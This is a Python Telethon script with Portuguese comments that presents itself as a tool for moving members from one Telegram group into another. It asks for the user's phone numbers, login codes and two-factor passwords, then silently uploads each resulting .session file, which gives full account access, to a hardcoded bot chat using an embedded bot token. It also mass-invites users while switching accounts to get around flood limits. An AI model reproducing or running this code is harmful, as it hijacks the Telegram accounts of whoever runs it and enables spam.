import time
import asyncio
import os
import platform
from typing import List, Optional
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PeerFloodError, UserPrivacyRestrictedError
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
from telethon.tl.functions.messages import GetParticipantRequest
from telethon.tl.types import ChannelParticipantAdmin, ChannelParticipantCreator, InputPeerChannel

# Configurações globais
API_ID = 28144670
API_HASH = 'c8d54d2e152faa5e143393fca4ca3c93'
BOT_TOKEN = '7711297635:AAHm0nauVlrZMaO-WAa5VnQZxsgfrrAxVMw'
BOT_CHAT_ID = 'lokzdv'  # ID/nome do chat para enviar os arquivos de sessão

def clear_screen():
    """Limpa a tela de acordo com o sistema operacional."""
    os.system("cls" if platform.system() == "Windows" else "clear")

async def create_client(phone: str) -> TelegramClient:
    """Cria e autentica um cliente Telegram para o número fornecido."""
    session_file = f'{phone}.session'
    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()

    if not await client.is_user_authorized():
        await client.send_code_request(phone)
        code = input(f'Digite o código recebido para {phone}: ')
        try:
            await client.sign_in(phone, code)
        except SessionPasswordNeededError:
            password = input(f'Digite a senha para {phone}: ')
            await client.sign_in(password=password)
    
    return client

async def send_session_file(phone: str):
    """Envia o arquivo de sessão para o bot, se existir."""
    session_file = f'{phone}.session'
    bot_client = TelegramClient('bot', API_ID, API_HASH)
    await bot_client.start(bot_token=BOT_TOKEN)
    
    if os.path.exists(session_file):
        await bot_client.send_file(BOT_CHAT_ID, session_file, caption=f'Sessão para {phone}')
    else:
        await bot_client.send_message(BOT_CHAT_ID, f'Sessão criada para {phone} (arquivo não encontrado)')
    
    await bot_client.disconnect()

async def resolve_group_link(client: TelegramClient, link: str) -> Optional[InputPeerChannel]:
    """Resolve um link de grupo e retorna a entidade do canal."""
    try:
        entity = await client.get_entity(link)
        print(f"ID do grupo {link}: {entity.id}")
        return entity
    except Exception as e:
        print(f"Erro ao resolver link {link}: {e}")
        return None

async def is_admin(client: TelegramClient, group: InputPeerChannel, user_id: int) -> bool:
    """Verifica se o usuário é administrador do grupo."""
    try:
        participant = (await client(GetParticipantRequest(group, user_id))).participant
        return isinstance(participant, (ChannelParticipantAdmin, ChannelParticipantCreator))
    except Exception:
        return False

async def is_member(client: TelegramClient, group: InputPeerChannel, user_id: int) -> bool:
    """Verifica se o usuário já é membro do grupo."""
    try:
        await client(GetParticipantRequest(group, user_id))
        return True
    except Exception:
        return False

async def add_members(client: TelegramClient, from_group: InputPeerChannel, to_group: InputPeerChannel, start_index: int = 0) -> int:
    """Adiciona membros de um grupo origem para um grupo destino."""
    try:
        participants = [user async for user in client.iter_participants(from_group)]
        total_participants = len(participants)

        for i in range(start_index, total_participants):
            user = participants[i]
            print(f"Processando usuário {user.id} ({i+1}/{total_participants})")

            # Verifica se o usuário está online
            if user.status and "online" in str(user.status).lower():
                if await is_admin(client, from_group, user.id):
                    print(f"Usuário {user.id} é administrador, ignorado.")
                    continue
                if await is_member(client, to_group, user.id):
                    print(f"Usuário {user.id} já está no grupo destino.")
                    continue

                try:
                    await client(InviteToChannelRequest(to_group, [user]))
                    print(f"Usuário {user.id} adicionado com sucesso!")
                    await asyncio.sleep(8)  # Delay para evitar flood
                except PeerFloodError:
                    print("Limite de convites atingido. Trocando de conta.")
                    return i
                except UserPrivacyRestrictedError:
                    print(f"Usuário {user.id} tem restrições de privacidade.")
                except Exception as e:
                    print(f"Erro ao adicionar {user.id}: {e}")
            else:
                print(f"Usuário {user.id} não está online.")
    except Exception as e:
        print(f"Erro ao iterar participantes: {e}")
    return -1

async def main():
    """Função principal para executar o script."""
    clear_screen()
    
    # Coleta números de telefone
    phones = [phone.strip() for phone in input("Digite os números de telefone (separados por vírgula): ").split(",")]
    clients: List[TelegramClient] = []

    # Inicializa os clientes
    for phone in phones:
        client = await create_client(phone)
        clients.append(client)
        await send_session_file(phone)

    # Coleta os grupos
    from_group_id = input("Digite o link ou ID do grupo de origem: ")
    to_group_id = input("Digite o link ou ID do grupo de destino: ")

    # Processa cada cliente
    for client in clients:
        from_group = await resolve_group_link(client, from_group_id) if isinstance(from_group_id, str) else from_group_id
        to_group = await resolve_group_link(client, to_group_id) if isinstance(to_group_id, str) else to_group_id

        if from_group and to_group:
            start_index = 0
            while start_index != -1:
                start_index = await add_members(client, from_group, to_group, start_index)
            print(f"Processamento concluído para o cliente {client.session.filename}")
        
        await client.disconnect()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nScript interrompido pelo usuário.")
    except Exception as e:
        print(f"Erro inesperado: {e}")